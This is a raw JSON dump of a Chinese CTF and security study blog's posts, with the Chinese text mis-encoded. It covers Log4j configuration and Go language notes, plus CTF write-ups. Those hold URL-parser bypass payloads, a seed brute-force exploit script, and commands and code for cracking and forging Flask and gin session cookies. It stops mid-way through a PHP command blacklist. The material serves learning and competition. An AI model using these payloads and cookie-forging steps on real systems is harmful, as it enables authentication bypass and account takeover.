éœ€æ”¹åŠ¨ä»£ç  Log4j æ—¥å¿—å®ç°ï¼ˆä¹ï¼‰Log4jï¼Œæˆ‘çœŸçš„å¥½å–œæ¬¢ä½ å•Šï¼ä¸ºäº†ä½ ï¼Œæˆ‘ä¸è¦ç”¨æ— åºåˆ—è¡¨äº†ï¼ï¼ï¼\nLog4jæ˜¯ä¸€ä¸ªç»„ä»¶åŒ–è®¾è®¡çš„æ—¥å¿—ç³»ç»Ÿï¼Œå®ƒçš„æ¶æ„å¤§è‡´å¦‚ä¸‹\nå½“æˆ‘ä»¬ä½¿ç”¨Log4jè¾“å‡ºä¸€æ¡æ—¥å¿—æ—¶ï¼ŒLog4jè‡ªåŠ¨é€šè¿‡ä¸åŒçš„AppenderæŠŠåŒä¸€æ¡æ—¥å¿—è¾“å‡ºåˆ°ä¸åŒçš„ç›®çš„åœ°\nconsoleï¼šè¾“å‡ºåˆ°å±å¹•ï¼› fileï¼šè¾“å‡ºåˆ°æ–‡ä»¶ï¼› socketï¼šé€šè¿‡ç½‘ç»œè¾“å‡ºåˆ°è¿œç¨‹è®¡ç®—æœºï¼› jdbcï¼šè¾“å‡ºåˆ°æ•°æ®åº“ é€šè¿‡Filteræ¥è¿‡æ»¤å“ªäº›logéœ€è¦è¢«è¾“å‡ºï¼Œæœ€åï¼Œé€šè¿‡Layoutæ¥æ ¼å¼åŒ–æ—¥å¿—ä¿¡æ¯\nä½¿ç”¨Log4jæ—¶åªéœ€æŠŠä¸€ä¸ªlog4j2.xmlçš„æ–‡ä»¶æ”¾åˆ°classpathä¸‹å°±å¯ä»¥è®©Log4jè¯»å–é…ç½®æ–‡ä»¶å¹¶æŒ‰ç…§æˆ‘ä»¬çš„é…ç½®æ¥è¾“å‡ºæ—¥å¿—\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;Configuration\u0026gt; \u0026lt;Properties\u0026gt; \u0026lt;!-- å®šä¹‰æ—¥å¿—æ ¼å¼ --\u0026gt; \u0026lt;Property name=\u0026#34;log.pattern\u0026#34;\u0026gt;%d{MM-dd HH:mm:ss.SSS} [%t] %-5level %logger{36}%n%msg%n%n\u0026lt;/Property\u0026gt; \u0026lt;!-- å®šä¹‰æ–‡ä»¶åå˜é‡ --\u0026gt; \u0026lt;Property name=\u0026#34;file.err.filename\u0026#34;\u0026gt;log/err.log\u0026lt;/Property\u0026gt; \u0026lt;Property name=\u0026#34;file.err.pattern\u0026#34;\u0026gt;log/err.%i.log.gz\u0026lt;/Property\u0026gt; \u0026lt;/Properties\u0026gt; \u0026lt;!-- å®šä¹‰Appenderï¼Œå³ç›®çš„åœ° --\u0026gt; \u0026lt;Appenders\u0026gt; \u0026lt;!-- å®šä¹‰è¾“å‡ºåˆ°å±å¹• --\u0026gt; \u0026lt;Console name=\u0026#34;console\u0026#34; target=\u0026#34;SYSTEM_OUT\u0026#34;\u0026gt; \u0026lt;!-- æ—¥å¿—æ ¼å¼å¼•ç”¨ä¸Šé¢å®šä¹‰çš„log.pattern --\u0026gt; \u0026lt;PatternLayout pattern=\u0026#34;${log.pattern}\u0026#34; /\u0026gt; \u0026lt;/Console\u0026gt; \u0026lt;!-- å®šä¹‰è¾“å‡ºåˆ°æ–‡ä»¶,æ–‡ä»¶åå¼•ç”¨ä¸Šé¢å®šä¹‰çš„file.err.filename --\u0026gt; \u0026lt;RollingFile name=\u0026#34;err\u0026#34; bufferedIO=\u0026#34;true\u0026#34; fileName=\u0026#34;${file.err.filename}\u0026#34; filePattern=\u0026#34;${file.err.pattern}\u0026#34;\u0026gt; \u0026lt;PatternLayout pattern=\u0026#34;${log.pattern}\u0026#34; /\u0026gt; \u0026lt;Policies\u0026gt; \u0026lt;!-- æ ¹æ®æ–‡ä»¶å¤§å°è‡ªåŠ¨åˆ‡å‰²æ—¥å¿— --\u0026gt; \u0026lt;SizeBasedTriggeringPolicy size=\u0026#34;1 MB\u0026#34; /\u0026gt; \u0026lt;/Policies\u0026gt; \u0026lt;!-- ä¿ç•™æœ€è¿‘10ä»½ --\u0026gt; \u0026lt;DefaultRolloverStrategy max=\u0026#34;10\u0026#34; /\u0026gt; \u0026lt;/RollingFile\u0026gt; \u0026lt;/Appenders\u0026gt; \u0026lt;Loggers\u0026gt; \u0026lt;Root level=\u0026#34;info\u0026#34;\u0026gt; \u0026lt;!-- å¯¹infoçº§åˆ«çš„æ—¥å¿—ï¼Œè¾“å‡ºåˆ°console --\u0026gt; \u0026lt;AppenderRef ref=\u0026#34;console\u0026#34; level=\u0026#34;info\u0026#34; /\u0026gt; \u0026lt;!-- å¯¹errorçº§åˆ«çš„æ—¥å¿—ï¼Œè¾“å‡ºåˆ°errï¼Œå³ä¸Šé¢å®šä¹‰çš„RollingFile --\u0026gt; \u0026lt;AppenderRef ref=\u0026#34;err\u0026#34; level=\u0026#34;error\u0026#34; /\u0026gt; \u0026lt;/Root\u0026gt; \u0026lt;/Loggers\u0026gt; \u0026lt;/Configuration\u0026gt; SLF4J\u0026amp;Logback ç±»ä¼¼ä¸Šé¢é‚£ä¸€å¯¹ï¼Œåšäº†äº›è®¸æ”¹è¿›\nCommons Logging SLF4J org.apache.commons.logging.Log org.slf4j.Logger org.apache.commons.logging.LogFactory org.slf4j.LoggerFactory ä»ä½¿ç”¨xml\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;configuration\u0026gt; \u0026lt;appender name=\u0026#34;CONSOLE\u0026#34; class=\u0026#34;ch.qos.logback.core.ConsoleAppender\u0026#34;\u0026gt; \u0026lt;encoder\u0026gt; \u0026lt;pattern\u0026gt;%d{HH:mm:ss.SSS} [%thread] %-5level %logger{36} - %msg%n\u0026lt;/pattern\u0026gt; \u0026lt;/encoder\u0026gt; \u0026lt;/appender\u0026gt; \u0026lt;appender name=\u0026#34;FILE\u0026#34; class=\u0026#34;ch.qos.logback.core.rolling.RollingFileAppender\u0026#34;\u0026gt; \u0026lt;encoder\u0026gt; \u0026lt;pattern\u0026gt;%d{HH:mm:ss.SSS} [%thread] %-5level %logger{36} - %msg%n\u0026lt;/pattern\u0026gt; \u0026lt;charset\u0026gt;utf-8\u0026lt;/charset\u0026gt; \u0026lt;/encoder\u0026gt; \u0026lt;file\u0026gt;log/output.log\u0026lt;/file\u0026gt; \u0026lt;rollingPolicy class=\u0026#34;ch.qos.logback.core.rolling.FixedWindowRollingPolicy\u0026#34;\u0026gt; \u0026lt;fileNamePattern\u0026gt;log/output.log.%i\u0026lt;/fileNamePattern\u0026gt; \u0026lt;/rollingPolicy\u0026gt; \u0026lt;triggeringPolicy class=\u0026#34;ch.qos.logback.core.rolling.SizeBasedTriggeringPolicy\u0026#34;\u0026gt; \u0026lt;MaxFileSize\u0026gt;1MB\u0026lt;/MaxFileSize\u0026gt; \u0026lt;/triggeringPolicy\u0026gt; \u0026lt;/appender\u0026gt; \u0026lt;root level=\u0026#34;INFO\u0026#34;\u0026gt; \u0026lt;appender-ref ref=\u0026#34;CONSOLE\u0026#34; /\u0026gt; \u0026lt;appender-ref ref=\u0026#34;FILE\u0026#34; /\u0026gt; \u0026lt;/root\u0026gt; \u0026lt;/configuration\u0026gt; å­¦å®ŒåŸºç¡€è¯­æ³•çš„æ„Ÿè§‰æ˜¯çº¦ç­‰äºåŒæ—¶å¤å»ºäº†PHP+c+Python+NodeJSï¼Œè™½è¯´æ˜¯é€Ÿé€šï¼Œä½†æ˜¯æ„Ÿè§‰è§¦ç±»æ—é€šï¼Œå¾ˆå¤šä¸œè¥¿éƒ½æ˜ç™½äº†ï¼ˆå¤§æ¦‚ï¼‰\n6å°æ—¶é€Ÿé€šåŸºç¡€ï¼Œä»Šå¤©å°±å¯ä»¥å­¦åå°„å’Œå…¶å®ƒçš„é«˜çº§ç”¨æ³•äº†ï¼å°±å¯ä»¥è·Ÿé“¾å­äº†ï¼ï¼ï¼\nå¥½è€¶ï¼ï¼ï¼\n","date":"2022-02-27T01:28:17+08:00","permalink":"https://amiaaaz.github.io/2022/02/27/java-study-notes-01/","section":"posts","tags":["Java"],"title":"Javaå­¦ä¹ ç¬”è®°â… "},{"categories":["NOTES\u0026SUMMARY","LTS"],"contents":"array\u0026amp;slice å˜é‡è¦†ç›– A slice is a descriptor of an array segment. It consists of a pointer to the array, the length of the segment, and its capacity (the maximum length of the segment).\nGo Slices: usage and internalsï¼ˆå»ºè®®ç›´æ¥çœ‹å®˜æ–¹æ–‡æ¡£ï¼Œæˆ‘è¿™é‡Œç®€å•å†™ä¸€ä¸‹\ngoä¸­å®šä¹‰æ•°ç»„çš„åŸºæœ¬æ“ä½œæ˜¯è¿™æ ·çš„\nvar a[4]int\t// intå‹ 4ä¸ªå…ƒç´  a[0] = 1\t// ä¸‹æ ‡ä¸º1çš„å…ƒç´ å€¼ä¸º1 i := a[0]\t// i == 1 åŸºæœ¬ç±»ä¼¼äºcçš„å†™æ³•ï¼Œæ•°ç»„å˜é‡ä»£è¡¨æ•´ä¸ªæ•°ç»„ï¼Œä½†æ˜¯å®ƒå¹¶ä¸æ˜¯ä¸€ä¸ªæŒ‡å‘ç¬¬ä¸€ä¸ªæ•°ç»„å…ƒç´ çš„æŒ‡é’ˆï¼Œæ‰€ä»¥è¯´æˆ‘ä»¬åœ¨æ“ä½œæ•°ç»„ä¸­çš„å€¼æ—¶å®é™…ä¸Šæ˜¯åœ¨ç”¨å®ƒå€¼çš„copy\nå¯¹äºsliceï¼Œæ—¢å¯ä»¥ç›´æ¥å£°æ˜\nletters := []string{\u0026#34;a\u0026#34;, \u0026#34;b\u0026#34;, \u0026#34;c\u0026#34;, \u0026#34;d\u0026#34;} ä¹Ÿå¯ä»¥ç”¨å†…ç½®çš„makeå‡½æ•°\n// func make([]T, len, cap) []T var s []byte s = make([]byte, 5, 5) // s == []byte{0, 0, 0, 0, 0} å…¶ä¸­ï¼Œ[]Tè¡¨ç¤ºtypeï¼Œlenè¡¨ç¤ºé•¿åº¦ï¼Œè€Œç¬¬ä¸‰ä¸ªå‚æ•°capæ˜¯å¯ä»¥ç¼ºçœçš„ï¼Œé»˜è®¤ç­‰äºlength\ns := make([]byte, 5) å…³äºsliceçš„ç»†èŠ‚æ˜¯æˆ‘ä»¬å…³æ³¨çš„é‡ç‚¹ï¼›å®ƒåŒ…å«äº†ä¸€ä¸ªæŒ‡å‘æ•°ç»„çš„æŒ‡é’ˆptrï¼Œæ®µçš„é•¿åº¦lenï¼Œè¿˜æœ‰æ®µçš„æœ€å¤§é•¿åº¦cap â€”â€”â€”â€”å…¶å®è¯´åˆ°è¿™é‡Œï¼Œå¦‚æœæœ‰ç»éªŒçš„å·²ç»èƒ½çŸ¥é“é—®é¢˜æ‰€åœ¨äº†\nä»¥ä¸Šé¢çš„sä¸ºä¾‹ï¼ˆç¼ºçœcapï¼‰ï¼Œç»“æ„æ˜¯è¿™æ ·çš„\nå½“æˆ‘ä»¬å¯¹sè¿›è¡Œåˆ‡ç‰‡æ“ä½œs = s[2:4]\nåˆ‡ç‰‡åˆ›å»ºäº†ä¸€ä¸ªæ–°çš„sliceï¼ˆlenå’Œcapå‡ä¸åŒï¼‰ï¼Œpträ»æŒ‡å‘åŸæ•°ç»„\næ‰€ä»¥ä¿®æ”¹æ–°çš„sliceçš„å…ƒç´ ä¼šä¿®æ”¹åŸå§‹sliceçš„å€¼\nd := []byte{\u0026#39;r\u0026#39;, \u0026#39;o\u0026#39;, \u0026#39;a\u0026#39;, \u0026#39;d\u0026#39;} e := d[2:] // e == []byte{\u0026#39;a\u0026#39;, \u0026#39;d\u0026#39;} e[1] = \u0026#39;m\u0026#39; // e == []byte{\u0026#39;a\u0026#39;, \u0026#39;m\u0026#39;} // d == []byte{\u0026#39;r\u0026#39;, \u0026#39;o\u0026#39;, \u0026#39;a\u0026#39;, \u0026#39;m\u0026#39;} å…ƒç´ çš„ä¸ªæ•°æ€»æ˜¯ä¸èƒ½è¶…è¿‡capä»£è¡¨çš„ä¸Šé™ï¼Œä¸ºäº†åŠ¨æ€åˆ†é…æ•°ç»„å¤§å°ï¼Œæˆ‘ä»¬æœ‰æ—¶ä¼šé€‰æ‹©è¿™æ ·çš„æ“ä½œ\nt := make([]byte, len(s), (cap(s)+1)*2) // +1 in case cap(s) == 0 for i := range s { t[i] = s[i] } s = t åˆ›å»ºä¸€ä¸ªæ–°çš„slice å¹¶æŠŠåŸæ¥çš„å€¼å¤åˆ¶è¿›æ¥ï¼Œæœ‰ä¸€ä¸ªå†…ç½®å‡½æ•°å¯ä»¥ç›´æ¥åš\nfunc copy(dst, src []T) int copyå…è®¸ä¼ å…¥lengthä¸åŒçš„ä¸¤ä¸ªsliceï¼Œå®ƒä¼šå¸®æˆ‘ä»¬å¤„ç†å¥½å¯èƒ½å­˜åœ¨çš„æ½œåœ¨é—®é¢˜ï¼Œç›´æ¥\nt := make([]byte, len(s), (cap(s)+1)*2) copy(t, s) s = t å³å¯\nå•çº¯å‘sliceä¸­æ·»åŠ å…ƒç´ å¯ä»¥ä½¿ç”¨å†…ç½®å‡½æ•°append\nfunc append(s []T, x ...T) []T å½“å¤§äºcapæ—¶å®ƒä¼šè‡ªåŠ¨è°ƒæ•´ï¼Œå¦‚æœè¦appendä¸€ä¸ªsliceä¹Ÿæ˜¯å¯ä»¥çš„\na := []string{\u0026#34;John\u0026#34;, \u0026#34;Paul\u0026#34;} b := []string{\u0026#34;George\u0026#34;, \u0026#34;Ringo\u0026#34;, \u0026#34;Pete\u0026#34;} a = append(a, b...) // equivalent to \u0026#34;append(a, b[0], b[1], b[2])\u0026#34; // a == []string{\u0026#34;John\u0026#34;, \u0026#34;Paul\u0026#34;, \u0026#34;George\u0026#34;, \u0026#34;Ringo\u0026#34;, \u0026#34;Pete\u0026#34;} è¿™åˆ†æäº†åŠå¤©ï¼Œç»ˆäºåˆ°é‡ç‚¹äº†ï¼‰\nä¸Šé¢æåˆ°äº†ï¼Œre-slicing a slice doesn\u0026rsquo;t make a copy of the underlying array, the full array will by kept in memory until it is no longer referenced\nä¸¾ä¸ªä¾‹å­\npackage main import ( \u0026#34;fmt\u0026#34; ) func main() { var a []int a = append(a,1) a = append(a,1) a = append(a,1) b := append(a,2) c := append(a,3) fmt.Println(b,c) } [1 1 1 3] [1 1 1 3] æˆ‘ä»¬å‘ç°3ä¹‹å‰çš„2è¢«è¦†ç›–äº†\nå‡è®¾å½“aæ•°ç»„åœ¨appendä¸€ä¸ªå…ƒç´ æ—¶ï¼ŒptræŒ‡å‘0x1(å‡è®¾0x1ä¸ºæ•°ç»„åœ°å€), len=1, cap=2ï¼›appendç¬¬äºŒä¸ªå…ƒç´ æ—¶pträ¸å˜ï¼Œlen=2, cap=2ï¼›appendç¬¬ä¸‰ä¸ªå…ƒç´ æ—¶å®¹é‡ä¸å¤Ÿäº†å°±ä¼šåŠ¨æ€æ‰©å®¹ï¼Œcap=4, len=3ï¼Œæ‰€ä»¥ptræŒ‡å‘æ–°çš„0x2\næ­¤æ—¶ptr=0x2, len=3, cap=4ï¼Œå†appendç¬¬å››ä¸ªå…ƒç´ ä¹Ÿå°±æ˜¯2çš„æ—¶å€™è¿˜ä¸éœ€è¦æ‰©å®¹ï¼Œè¿”å›ptr=0x2, len=4, cap=4ç»™bï¼Œä½†æ­¤æ—¶å¯¹äºaè€Œè¨€len=3ï¼Œç›¸å½“äºæ˜¯æ·»åŠ å…ƒç´ ç„¶åå¦å­˜ä¸ºäº†ï¼Œå¯¹åŸæ•°ç»„ä¸å½±å“ï¼Œcä¹Ÿæ˜¯ä¸€æ ·çš„æƒ…å†µ\nâ€”â€”â€”â€”ä¸çŸ¥é“æˆ‘æœ‰æ²¡æœ‰è§£é‡Šæ¸…æ¥šQwQ\n[Teaser CONFidence CTF 2019]The Lottery å‚è€ƒï¼šwp | wp | wp2\n[RoarCTF 2019]Dist æ˜¯ä¸Šé¢é‚£ä¸ªé¢˜çš„æ”¹ç¼–\nå‚è€ƒï¼šwp1\nCVE-2019-14809 è§£æhost javascript://%250aalert(1)+\u0026#39;aa@google.com/a\u0026#39;a http://[google.com]:80 http://google.com]:80 http://google.com]:80__Anything_you\u0026#39;d_like_sir http://[google.com]FreeTextZoneHere]:80 ç”±äºnet/urlåº“çš„é—®é¢˜ï¼Œè¿™äº›URIè§£æå‡ºæ¥Hostéƒ½æ˜¯google.com\næŸä¸çŸ¥åé¢˜ package main import ( \u0026#34;fmt\u0026#34; \u0026#34;io/ioutil\u0026#34; \u0026#34;log\u0026#34; \u0026#34;net/http\u0026#34; \u0026#34;net/url\u0026#34; \u0026#34;strings\u0026#34; ) func SanCheck(input string) error { u, err := url.Parse(input) if err != nil { return err } if u.Scheme != \u0026#34;http\u0026#34; { return fmt.Errorf(\u0026#34;err: Invalid Scheme [%s]\u0026#34;, u.Scheme) } if u.Opaque != \u0026#34;\u0026#34; { return fmt.Errorf(\u0026#34;err: WHAT AER YOU DOING ?!!! (%s)\u0026#34;, u.Opaque) } if u.Hostname() != \u0026#34;127.0.0.1\u0026#34; { return fmt.Errorf(\u0026#34;err: Invalid Hostname [%s]\u0026#34;, u.Hostname()) } if u.Port() != \u0026#34;\u0026#34; \u0026amp;\u0026amp; u.Port() != \u0026#34;80\u0026#34; { return fmt.Errorf(\u0026#34;err: Invalid Port [%s]\u0026#34;, u.Port()) } if u.User == nil { return fmt.Errorf(\u0026#34;err: Authorization Required\u0026#34;) } if u.User.Username() != \u0026#34;root\u0026#34; { return fmt.Errorf(\u0026#34;err: Invalid Username [%s]\u0026#34;, u.User.Username()) } if password, set := u.User.Password(); !set || password != \u0026#34;P@ssw0rd!\u0026#34; { return fmt.Errorf(\u0026#34;err: Invalid Password [%s]\u0026#34;, password) } if u.RequestURI() != \u0026#34;/flag.php\u0026#34; { return fmt.Errorf(\u0026#34;err: Invalid RequestURI [%s]\u0026#34;, u.RequestURI()) } if u.Fragment != \u0026#34;\u0026#34; { return fmt.Errorf(\u0026#34;err: Invalid Fragment [%s]\u0026#34;, u.Fragment) } if !strings.Contains(u.String(), \u0026#34;\u0026#39;Pwned!\u0026#39;\u0026#34;) { fmt.Println(u.String()) return fmt.Errorf(\u0026#34;err: San Check failed\u0026#34; + u.String()) } return nil } payload\nhttp://root:P@ssw0rd!@[127.0.0.1][\u0026#39;Pwned!\u0026#39;]:80/flag.php rand.Seed ç§å­å°çš„æƒ…å†µä¸‹å¯çˆ†ç ´ [RACTF 2021]Military Grade package main import ( \u0026#34;bytes\u0026#34; \u0026#34;crypto/aes\u0026#34; \u0026#34;crypto/cipher\u0026#34; \u0026#34;encoding/hex\u0026#34; \u0026#34;fmt\u0026#34; \u0026#34;log\u0026#34; \u0026#34;math/rand\u0026#34; \u0026#34;net/http\u0026#34; \u0026#34;sync\u0026#34; \u0026#34;time\u0026#34; ) const rawFlag = \u0026#34;[REDACTED]\u0026#34; var flag string var flagmu sync.Mutex func PKCS5Padding(ciphertext []byte, blockSize int, after int) []byte { padding := (blockSize - len(ciphertext)%blockSize) padtext := bytes.Repeat([]byte{byte(padding)}, padding) return append(ciphertext, padtext...) } func encrypt(plaintext string, bKey []byte, bIV []byte, blockSize int) string { bPlaintext := PKCS5Padding([]byte(plaintext), blockSize, len(plaintext)) block, err := aes.NewCipher(bKey) if err != nil { log.Println(err) return \u0026#34;\u0026#34; } ciphertext := make([]byte, len(bPlaintext)) mode := cipher.NewCBCEncrypter(block, bIV) mode.CryptBlocks(ciphertext, bPlaintext) return hex.EncodeToString(ciphertext) } func changer() { ticker := time.NewTicker(time.Millisecond * 672).C for range ticker { rand.Seed(time.Now().UnixNano() \u0026amp; ^0x7FFFFFFFFEFFF000) for i := 0; i \u0026lt; rand.Intn(32); i++ { rand.Seed(rand.Int63()) } var key []byte var iv []byte for i := 0; i \u0026lt; 32; i++ { key = append(key, byte(rand.Intn(255))) } for i := 0; i \u0026lt; aes.BlockSize; i++ { iv = append(iv, byte(rand.Intn(255))) } flagmu.Lock() flag = encrypt(rawFlag, key, iv, aes.BlockSize) flagmu.Unlock() } } func handler(w http.ResponseWriter, req *http.Request) { flagmu.Lock() fmt.Fprint(w, flag) flagmu.Unlock() } func main() { log.Println(\u0026#34;Challenge starting up\u0026#34;) http.HandleFunc(\u0026#34;/\u0026#34;, handler) go changer() log.Fatal(http.ListenAndServe(\u0026#34;:80\u0026#34;, nil)) } flag è¢« AES CBC åŠ å¯†ï¼ŒåŠ å¯†æœ¬èº«æ²¡é—®é¢˜ï¼Œé—®é¢˜å‡ºåœ¨ç§å­ä¸Š\nç§å­ç”Ÿæˆæ˜¯é  rand.Seed(time.Now().UnixNano() \u0026amp; ^0x7FFFFFFFFEFFF000) å®Œæˆï¼Œè¿™æ ·å¾—åˆ°çš„ç§å­å¾ˆå° å¯ä»¥è¢«æˆ‘ä»¬çˆ†ç ´å‡ºæ¥\nexp.go\npackage main import( \u0026#34;math/rand\u0026#34; \u0026#34;crypto/aes\u0026#34; \u0026#34;crypto/cipher\u0026#34; \u0026#34;encoding/hex\u0026#34; \u0026#34;fmt\u0026#34; \u0026#34;strings\u0026#34; ) func main() { hextext := \u0026#34;35e57017892d2c615ed057d20eeee56f82c7b02d2d1b7efed6944c3cc660c914\u0026#34; // Encrypted Flag for seed:=1; seed\u0026lt;=19777868; seed++ { rand.Seed(int64(seed)) for i := 0; i \u0026lt; rand.Intn(32); i++ { rand.Seed(rand.Int63()) } var key []byte var iv []byte for i := 0; i \u0026lt; 32; i++ { key = append(key, byte(rand.Intn(255))) } for i := 0; i \u0026lt; aes.BlockSize; i++ { iv = append(iv, byte(rand.Intn(255))) } block, _ := aes.NewCipher(key) mode := cipher.NewCBCDecrypter(block, iv) ciphertext, _ := hex.DecodeString(hextext) flagBytes := make([]byte, len(ciphertext)) mode.CryptBlocks(flagBytes, ciphertext) flag := string(flagBytes) if strings.Contains(flag, \u0026#34;ractf\u0026#34;) { fmt.Printf(\u0026#34;Flag: %s\\n\u0026#34;, flag) break } } } ractf{int3rEst1ng_M4sk_paTt3rn}\nmath/randæœªè°ƒç”¨Seedé»˜è®¤ç§å­ä¸º1 [WMCTF2020]GOGOGO å‚è€ƒï¼šwp\nuint32æ•´æ•°æº¢å‡º uint32çš„èŒƒå›´æ˜¯0~4294967295\n[ç¾ŠåŸæ¯2021]Checkin_Go u1, err1 := strconv.ParseUint(nowMoney,10,32) u2, err2 := strconv.ParseUint(addMoney,10,32) .... newMoney = uint32(u1) + uint32(u2) flag priceæ˜¯uint32ï¼Œä»¥adminèº«ä»½ï¼ˆä¼ªé€ cookieï¼‰åŠ åˆ°æº¢å‡ºï¼Œå˜å°ï¼Œå°±å¯ä»¥ä¹°äº†\nå‚è€ƒï¼šwp\nginæ¡†æ¶ä¼ªé€ cookie secure-cookie-faker å·¥å…·ï¼šsecure-cookie-faker\ndecode:\n.\\secure-cookie-faker.exe dec -c \u0026#34;\u0026#34; æœ‰type detailçš„å°±æ˜¯object string\nencode:\n.\\secure-cookie-faker.exe enc -n \u0026#34;mysession\u0026#34; -k \u0026#34;secret\u0026#34; -o \u0026#34;{user: admin, id: 0[int]}\u0026#34; -o : object stringï¼Œits like a K-V map, it should have type hints -n : cookie name, its required because the HMAC hash\u0026rsquo;s generation relies on it -k : secret key(s), could be multiple: -k \u0026quot;key1, key2\u0026quot;, the first is hash key, and the second is encrypt block key when element\u0026rsquo;s type is string, the type tag can be omitted\ntype tag can only be int, uint, float, bool, string, byte\nchange serializer\n.\\secure-cookie-faker.exe enc -n \u0026#34;mysession\u0026#34; -k \u0026#34;secret\u0026#34; -o \u0026#34;some-string\u0026#34; -way json .\\secure-cookie-faker.exe enc -n \u0026#34;mysession\u0026#34; -k \u0026#34;secret\u0026#34; -o \u0026#34;{id: 0[int]}\u0026#34; -way json .\\secure-cookie-faker.exe enc -n \u0026#34;mysession\u0026#34; -k \u0026#34;secret\u0026#34; -o \u0026#34;some-string\u0026#34; -way nop .\\secure-cookie-faker.exe dec -c \u0026#34;MTU2NjkxMjI4NXxleUoxYzJWeUlqb2lZV1J0YVc0aWZRbz18OibftwH33BZStXtep7TbN_mbyk8RftQe9t_wxCJXhHo=\u0026#34; -way json è„šæœ¬ package main import ( \u0026#34;github.com/gin-contrib/sessions\u0026#34; \u0026#34;github.com/gin-contrib/sessions/cookie\u0026#34; \u0026#34;github.com/gin-gonic/gin\u0026#34; \u0026#34;math/rand\u0026#34; ) func main() { r := gin.Default() storage := cookie.NewStore(randomChar(16)) r.Use(sessions.Sessions(\u0026#34;o\u0026#34;, storage)) r.GET(\u0026#34;/\u0026#34;, cookieHandler) r.Run(\u0026#34;0.0.0.0:8002\u0026#34;) } func cookieHandler(c *gin.Context) { session := sessions.Default(c) session.Set(\u0026#34;uname\u0026#34;, \u0026#34;admin\u0026#34;)\t// ä¿®æ”¹å¤„ session.Save() } func randomChar(l int) []byte { output := make([]byte, l) rand.Read(output) return output }\t// ä¼ªéšæœº [VNCTF 2022]gocalc0 æ®è¯´æ˜¯yè€å¸ˆå‡ºé¢˜æœ‰è¯¯ï¼Œå¯¼è‡´å¼‚å¸¸ç®€å•\nemmmm\ngo\u0026lt;=1.11 net/heepå­˜åœ¨CRLFæ¼æ´ https://github.com/go/go/issues/30794\n[WMCTF2020]GOGOGO å‚è€ƒï¼šwp\n","date":"2022-02-26T15:58:41+08:00","permalink":"https://amiaaaz.github.io/2022/02/26/go-study-notes-01/","section":"posts","tags":["Go"],"title":"Goå­¦ä¹ ç¬”è®°â… "},{"categories":["CTF"],"contents":"å…¶ä½™çš„çœ‹wpäº‘äº†\nhttps://dctf21.cyberedu.ro/#challenges\nhttps://ctftime.org/event/1560/tasks/\nhttp://www.yongsheng.site/2022/02/14/DefCamp%20CTF(D-CTF)2021-22%20web/\nweb-intro Are you an admin?\nNote: Access Denied is part of the challenge.\n34.159.7.96:32291\né¦–é¡µå°±æ˜¯403ï¼Œcookieéƒ¨åˆ†æ˜¯flask session\n$ python3 flask_session_cookie_manager3.py decode -c \u0026#39;eyJsb2dnZWRfaW4iOmZhbHNlfQ.YgfX-Q.-TlY9gWLpyzptE31U0IwjpQ74ZI\u0026#39; b\u0026#39;{\u0026#34;logged_in\u0026#34;:false}\u0026#39; ä½†æ˜¯ä¸çŸ¥é“secret-keyæ˜¯å•¥ï¼Œç”¨c-jwt-crackerï¼Œçˆ†äº†å¾ˆä¹…æ²¡çˆ†å‡ºæ¥keyï¼Œæ¢flask-unsign\nflask-unsign --unsign --cookie \u0026#34;eyJsb2dnZWRfaW4iOmZhbHNlfQ.YgfX-Q.-TlY9gWLpyzptE31U0IwjpQ74ZI\u0026#34; ç‰¹åˆ«å¿«å°±è·‘å‡ºæ¥äº†ã€‚ã€‚ã€‚keyæ˜¯passwordï¼ŒæŠŠfalseæ”¹ä¸ºtrueå³å¯ï¼Œæ³¨æ„tè¦å¤§å†™ï¼\nflask-unsign --sign --cookie \u0026#34;{\u0026#39;logged_in\u0026#39;:True}\u0026#34; --secret \u0026#39;password\u0026#39; eyJsb2dnZWRfaW4iOnRydWV9.Yg0uRg.9__6dvOpRJAfT_xO1SeU_jNk3CQ\nè¿™ä¸ªæ•…äº‹å‘Šè¯‰æˆ‘ä»¬ä¸èƒ½ç”¨c-jwt-crackerï¼Œå¿«è·‘ï¼ï¼ï¼\npara-code I do not think that this API needs any sort of security testing as it only executes and retrieves the output of ID and PS commands.\n34.159.129.6:32136\n\u0026lt;?php require __DIR__ . \u0026#39;/flag.php\u0026#39;; if (!isset($_GET[\u0026#39;start\u0026#39;])){ show_source(__FILE__); exit; } $blackList = array( \u0026#39;ss\u0026#39;,\u0026#39;sc\u0026#39;,\u0026#39;aa\u0026#39;,\u0026#39;od\u0026#39;,\u0026#39;pr\u0026#39;,\u0026#39;pw\u0026#39;,\u0026#39;pf\u0026#39;,\u0026#39;ps\u0026#39;,\u0026#39;pa\u0026#39;,\u0026#39;pd\u0026#39;,\u0026#39;pp\u0026#39;,\u0026#39;po\u0026#39;,\u0026#39;pc\u0026#39;,\u0026#39;pz\u0026#39;,\u0026#39;pq\u0026#39;,\u0026#39;pt\u0026#39;,\u0026#39;pu\u0026#39;,\u0026#39;pv\u0026#39;,\u0026#39;pw\u0026#39;,\u0026#39;px\u0026#39;,\u0026#39;py\u0026#39;,\u0026#39;pq\u0026#39;,\u0026#39;pk\u0026#39;,\u0026#39;pj\u0026#39;,\u0026#39;pl\u0026#39;,\u0026#39;pm\u0026#39;,\u0026#39;pn\u0026#39;,\u0026#39;pq\u0026#39;,\u0026#39;pf\u0026#39;,\u0026#39;pz\u0026#39;,\u0026#39;pv\u0026#39;,\u0026#39;pw\u0026#39;,\u0026#39;px\u0026#39;,\u0026#39;py\u0026#39;,\u0026#39;pq\u0026#39;,\u0026#39;pk\u0026#39;,\u0026#39;pj\u0026#39;,\u0026#39;pl\u0026#39;,\u0026#39;pm\u0026#39;,\u0026#39;pn\u0026#39;,\u0026#39;pq\u0026#39;,\u0026#39;pf\u0026#39;,\u0026#39;pz\u0026#39;,\u0026#39;pv\u0026#39;,\u0026#39;pw\u0026#39;,\u0026#39;px\u0026#39;,\u0026#39;py\u0026#39;,\u0026#39;pq\u0026#39;,\u0026#39;pk\u0026#39;,\u0026#39;pj\u0026#39;,\u0026#39;pl\u0026#39;,\u0026#39;pm\u0026#39;,\u0026#39;pn\u0026#39;,\u0026#39;pq\u0026#39;,\u0026#39;pf\u0026#39;,\u0026#39;pz\u0026#39;,\u0026#39;pv\u0026#39;,\u0026#39;pw\u0026#39;,\u0026#39;px\u0026#39;,\u0026#39;py\u0026#39;,\u0026#39;pq\u0026#39;,\u0026#39;pk\u0026#39;,\u0026#39;pj\u0026#39;